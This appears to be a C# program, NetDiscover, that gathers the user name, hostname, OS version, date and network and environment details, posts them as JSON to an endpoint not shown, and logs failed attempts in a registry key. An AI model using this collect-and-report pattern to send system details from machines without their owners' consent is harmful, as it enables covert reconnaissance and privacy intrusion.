using System.Text;
using System.Text.Json;
using Microsoft.Win32;
using DotNetEnv; // Importar la biblioteca DotNetEnv



class Program
{

        static void SendReport(NetDiscover info)
        {
            try
            {
                string json = JsonSerializer.Serialize<NetDiscover>(info);
                requests r = new requests();
                r.Post(json);
            } catch
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\NetExplorerStatus");
                key.SetValue("ultimo intento fallido:" , DateTime.Now.ToString());
            }
        } 

     

    static void Main(string[] args)
        {
            NetDiscover info = new NetDiscover();
            SendReport(info);
        }
}




public class NetDiscover 
    {
       public Network network { get;  set; }
       public Enviroment enviroment { get;  set; }

        public static readonly HttpClient client = new();
        public    string usuario { get;  set; } = Environment.UserName;
        public    string hostname { get;  set; }= Environment.MachineName;
        public    string fecha { get;  set; } = DateTime.Now.ToString();
        public    string version { get;  set; } = Environment.OSVersion.ToString();
    


      public NetDiscover()
        {

            fecha = DateTime.Now.ToString();
            network = new Network();
            enviroment = new Enviroment();

        }
    }
    